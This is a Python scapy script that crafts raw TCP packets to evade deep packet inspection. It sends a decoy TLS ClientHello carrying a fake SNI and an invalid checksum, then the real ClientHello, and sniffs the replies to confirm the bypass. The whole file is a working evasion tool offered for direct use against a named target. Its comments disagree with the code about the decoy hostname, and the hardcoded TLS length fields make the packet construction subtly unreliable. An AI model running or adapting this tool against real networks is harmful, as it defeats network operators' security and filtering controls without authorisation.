#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff

# --- CONTEXT: CHECKSUM SHADOW V1.0 (VERIFICATION ASYMMETRY) ---
# SYSTEM_DIRECTIVE: Exploit the Checksum-Validation Gap in hardware DPI.
# TECHNIQUE: Invalid-Checksum Decoy + Valid-Checksum Reality.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class ChecksumShadow:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.sport = random.randint(30000, 60000)
        self.seq = random.randint(100000, 900000)
        self.ack = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] ChecksumShadow Initialized. target: {target_host} ({self.target_ip})")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.ack = pkt[TCP].seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=15, store=0)

    def _get_tls_payload(self, sni):
        sni_b = sni.encode()
        payload = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00"
        ext_sni = b"\x00\x00" + (len(sni_b)+5).to_bytes(2,'big') + (len(sni_b)+3).to_bytes(2,'big') + b"\x00" + len(sni_b).to_bytes(2,'big') + sni_b
        payload += (len(ext_sni)).to_bytes(2, 'big') + ext_sni
        return payload

    def execute_shadow(self):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Handshake...")
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq)
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        self.seq += 1
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print("    [+] Session ESTABLISHED.")

        print("[*] Phase 2: Injecting Checksum Shadow Paradox...")
        decoy_payload = self._get_tls_payload("www.bing.com")
        real_payload = self._get_tls_payload(self.target_host)
        
        self.expected_ack = self.seq + len(real_payload)

        # --- THE EXPLOIT ---
        # 1. Decoy with INVALID checksum. 
        # DPI sees 'google.com' and caches it. Target host DROPS it.
        print("    [>] Delivering Poisoned Decoy (Invalid Checksum)...")
        decoy_pkt = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/decoy_payload
        decoy_pkt[TCP].chksum = 0xbeef # Force corruption
        send(decoy_pkt, verbose=0)
        
        time.sleep(0.05)

        # 2. Real with VALID checksum.
        # DPI ignores as 'Retransmission'. Target host ACCEPTS.
        print("    [>] Delivering Real Payload (Valid Checksum)...")
        real_pkt = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/real_payload
        send(real_pkt, verbose=0)

        print("[*] Phase 3: Verifying Verification Gap...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  CHECKSUM SHADOW: BYPASS RIGOROUSLY VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. Target accepted the valid reality.")
            print("STATUS: The DPI reassembler is blinded by the Poisoned Decoy.")
            print("WHY:    The observer skipped checksum verification, accepting")
            print("        the decoy as truth and ignoring the valid reality.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. Observer may be verifying checksums.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    args = parser.parse_args()
    
    ChecksumShadow(args.target).execute_shadow()
